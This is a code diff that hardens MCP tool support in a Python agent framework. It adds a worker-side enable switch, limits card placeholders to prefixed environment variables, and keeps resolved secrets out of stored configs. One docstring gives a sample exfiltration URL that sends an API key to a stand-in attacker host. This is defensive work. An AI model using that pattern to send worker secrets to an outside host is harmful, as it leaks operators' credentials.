@@ -8,6 +8,8 @@ This module contains protocol-level concerns only:
 
 from __future__ import annotations
 
+import os
+import re
 from collections.abc import Callable
 from typing import Any, Literal
 
@@ -16,6 +18,25 @@ from pydantic import BaseModel, Field
 from akgentic.tool.core import ToolCard
 
 MCPHTTPTransport = Literal["streamable-http", "sse"]
+
+MCP_ENABLED_ENV = "AKGENTIC_MCP_ENABLED"
+"""Worker switch for `MCPTool`. Off unless set to `true`, `1` or `yes` (any case).
+
+An MCP card can launch any command on the worker (stdio) or send what it reads to any host
+(HTTP), so whoever can write one controls the worker. The switch lives in the worker's
+environment, never on the card, so a card author cannot turn it on.
+"""
+
+MCP_SECRET_PREFIX = "AKGENTIC_MCP_SECRET_"
+"""The only environment variables a `${VAR}` placeholder in an MCP card may read.
+
+Without it, a card author could send any worker secret (database URL, LLM key) to a host they
+control, e.g. `url: https://evil.example/?k=${OPENAI_API_KEY}`. Operators expose a value to MCP
+cards by exporting it under this prefix.
+"""
+
+_TRUTHY = frozenset({"true", "1", "yes"})
+_ENV_PLACEHOLDER = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}")
 
 
 class MCPHTTPConnectionConfig(BaseModel):
@@ -110,6 +131,91 @@ class MCPDiagnosticsConfig(BaseModel):
     max_tools_to_print: int = Field(default=20, ge=1)
 
 
+def _resolve_env_placeholders(value: str) -> str:
+    """Replace every `${VAR}` in `value` with the worker's environment variable `VAR`.
+
+    Called only while a transport is being built, on the strings handed to it. The result
+    must stay in locals: the connection config is serialized into team cards and the event
+    store, so writing a resolved value back onto it would persist the secret.
+
+    Only variables named with `MCP_SECRET_PREFIX` can be read; any other name is refused,
+    so a card cannot reach the rest of the worker's environment. An unset or empty variable
+    is an error rather than an empty substitution, so a missing secret fails at toolset build
+    instead of reaching the server as a blank credential. Messages name the variable, never
+    a value.
+
+    Args:
+        value: String that may contain `${VAR}` placeholders.
+
+    Returns:
+        `value` with each placeholder replaced; unchanged if it has none.
+
+    Raises:
+        ValueError: If a referenced variable lacks the prefix, or is unset or empty.
+    """
+
+    def substitute(match: re.Match[str]) -> str:
+        name = match.group(1)
+        _require_readable(name)
+        return os.environ[name]
+
+    return _ENV_PLACEHOLDER.sub(substitute, value)
+
+
+def _require_readable(name: str) -> None:
+    """Refuse a placeholder name that lacks the prefix or whose variable is unset or empty.
+
+    Never binds the variable's value, so a refusal leaves no secret in any frame.
+
+    Raises:
+        ValueError: Naming the variable, never a value.
+    """
+    if not name.startswith(MCP_SECRET_PREFIX):
+        raise ValueError(
+            f"MCP connection references environment variable '{name}'; only variables "
+            f"named '{MCP_SECRET_PREFIX}*' can be read by an MCP card"
+        )
+    if not os.environ.get(name):
+        raise ValueError(
+            f"MCP connection references environment variable '{name}', "
+            "which is not set on this worker"
+        )
+
+
+def _check_placeholders(*values: str | None) -> None:
+    """Validate every placeholder a transport will resolve, before any is resolved.
+
+    A builder resolves several fields in turn. Without this pass, a placeholder that fails
+    late would raise while an earlier field's resolved secret is still a local, where an
+    error reporter that captures frame locals would record it.
+
+    Raises:
+        ValueError: If any placeholder is refused or unset (see `_require_readable`).
+    """
+    for value in values:
+        for name in _ENV_PLACEHOLDER.findall(value or ""):
+            _require_readable(name)
+
+
+def _require_mcp_enabled() -> None:
+    """Refuse to build any MCP transport unless the worker has switched MCP on.
+
+    Raises:
+        PermissionError: If `MCP_ENABLED_ENV` is not set to a truthy value.
+    """
+    if os.environ.get(MCP_ENABLED_ENV, "").strip().lower() not in _TRUTHY:
+        raise PermissionError(
+            f"MCPTool is disabled on this worker; set {MCP_ENABLED_ENV}=true to enable it. "
+            "Anyone who can write an MCP card can run commands on the worker, so enable it "
+            "only where writing tool cards is restricted to administrators."
+        )
+
+
+def _resolve_optional(value: str | None) -> str | None:
+    """Resolve `${VAR}` placeholders in an optional string; `None` passes through."""
+    return None if value is None else _resolve_env_placeholders(value)
+
+
 def _mcp_auth_headers(bearer_token: str | None) -> dict[str, str] | None:
     """Build HTTP authorization headers from a bearer token.
 
@@ -169,6 +275,11 @@ def _build_stdio_transport(
 ) -> Any:
     """Map a stdio connection config onto a fastmcp stdio transport.
 
+    `${VAR}` placeholders in `stdio_env` values, `stdio_args` and `bearer_token` are
+    resolved from the worker's environment into locals. This is the only way to give a
+    stdio server a secret without storing it in the catalog: the MCP SDK passes the
+    subprocess just `HOME, LOGNAME, PATH, SHELL, TERM, USER` plus `stdio_env`.
+
     Args:
         connection: stdio MCP connection configuration.
         stdio_transport_cls: The `StdioTransport` class to instantiate.
@@ -177,18 +288,26 @@ def _build_stdio_transport(
         A configured stdio transport.
 
     Raises:
-        ValueError: If stdio_command is missing.
+        ValueError: If stdio_command is missing, or a placeholder is refused or unset.
     """
     if not connection.stdio_command:
         raise ValueError("stdio_command is required for MCPStdioConnectionConfig")
 
-    env = dict(connection.stdio_env or {})
-    if connection.stdio_token_env_var and connection.bearer_token:
-        env[connection.stdio_token_env_var] = connection.bearer_token
+    # The token reaches a stdio server only through stdio_token_env_var; unused, it is
+    # neither checked nor resolved, so a stale placeholder there cannot fail the build.
+    token = connection.bearer_token if connection.stdio_token_env_var else None
+    _check_placeholders(*(connection.stdio_env or {}).values(), *connection.stdio_args, token)
+
+    env = {
+        key: _resolve_env_placeholders(value) for key, value in (connection.stdio_env or {}).items()
+    }
+    bearer_token = _resolve_optional(token)
+    if connection.stdio_token_env_var and bearer_token:
+        env[connection.stdio_token_env_var] = bearer_token
 
     return stdio_transport_cls(
         command=connection.stdio_command,
-        args=connection.stdio_args,
+        args=[_resolve_env_placeholders(arg) for arg in connection.stdio_args],
         env=env or None,
         cwd=connection.stdio_cwd,
     )
@@ -215,6 +334,9 @@ def _build_mcp_transport(connection: MCPConnectionConfig) -> Any:
     `sse_read_timeout` there and derives that timeout from the session's
     `read_timeout_seconds`, which the toolset already supplies.
 
+    `${VAR}` placeholders in `url` and `bearer_token` are resolved from the worker's
+    environment into locals and never written back onto `connection`.
+
     Args:
         connection: MCP connection configuration (HTTP/SSE or stdio).
 
@@ -222,21 +344,24 @@ def _build_mcp_transport(connection: MCPConnectionConfig) -> Any:
         A configured fastmcp transport instance.
 
     Raises:
-        ValueError: If stdio_command is missing for stdio transport.
+        ValueError: If stdio_command is missing for stdio transport, or a placeholder is
+            refused or unset.
     """
     stdio_transport_cls, sse_transport_cls, http_transport_cls = _load_mcp_transport_classes()
 
     if isinstance(connection, MCPStdioConnectionConfig):
         return _build_stdio_transport(connection, stdio_transport_cls)
 
-    headers = _mcp_auth_headers(connection.bearer_token)
+    _check_placeholders(connection.url, connection.bearer_token)
+    url = _resolve_env_placeholders(connection.url)
+    headers = _mcp_auth_headers(_resolve_optional(connection.bearer_token))
     if connection.transport == "sse":
         return sse_transport_cls(
-            url=connection.url,
+            url=url,
             headers=headers,
             sse_read_timeout=connection.read_timeout,
         )
-    return http_transport_cls(url=connection.url, headers=headers)
+    return http_transport_cls(url=url, headers=headers)
 
 
 def _build_mcp_toolset(connection: MCPConnectionConfig) -> Any:
@@ -254,6 +379,10 @@ def _build_mcp_toolset(connection: MCPConnectionConfig) -> Any:
     adding a field to carry the old constant would change their stored shape for a value
     the agent already owns.
 
+    Every path that builds a toolset — `MCPTool.get_toolsets()` and the diagnostics — goes
+    through here, so this is where the `MCP_ENABLED_ENV` switch is enforced, before any
+    command is launched or any host contacted.
+
     Args:
         connection: MCP connection configuration (HTTP/SSE or stdio).
 
@@ -261,8 +390,11 @@ def _build_mcp_toolset(connection: MCPConnectionConfig) -> Any:
         An `MCPToolset` with no tool-name prefix applied.
 
     Raises:
-        ValueError: If stdio_command is missing for stdio transport.
+        PermissionError: If MCP is not enabled on this worker.
+        ValueError: If stdio_command is missing for stdio transport, or a placeholder is
+            refused or unset.
     """
+    _require_mcp_enabled()
     toolset_cls = _load_mcp_toolset_class()
     return toolset_cls(
         _build_mcp_transport(connection),
@@ -297,7 +429,9 @@ class MCPTool(ToolCard):
             pydantic-ai agents.
 
         Raises:
-            ValueError: If stdio_command is missing for stdio transport.
+            PermissionError: If MCP is not enabled on this worker (`MCP_ENABLED_ENV`).
+            ValueError: If stdio_command is missing for stdio transport, or a `${VAR}`
+                placeholder is refused or unset.
         """
         toolset = _build_mcp_toolset(self.connection)
         if self.connection.tool_prefix:
@@ -316,7 +450,9 @@ async def list_mcp_tools(connection: MCPConnectionConfig) -> list[str]:
         them (i.e. without any configured `tool_prefix` applied).
 
     Raises:
-        ValueError: If stdio_command is missing for stdio transport.
+        PermissionError: If MCP is not enabled on this worker (`MCP_ENABLED_ENV`).
+        ValueError: If stdio_command is missing for stdio transport, or a `${VAR}`
+            placeholder is refused or unset.
         Exception: If connection fails or server is unreachable.
     """
     print("## Creating MCP toolset for diagnostics...")
@@ -344,6 +480,10 @@ async def probe_mcp_connection(
 
     Returns:
         Dictionary with tool_count, tools (list), and feasible (bool).
+
+    Raises:
+        PermissionError: If MCP is not enabled on this worker (`MCP_ENABLED_ENV`).
+        ValueError: If the connection cannot be built (see `list_mcp_tools`).
     """
     tool_names = await list_mcp_tools(connection)
     return {
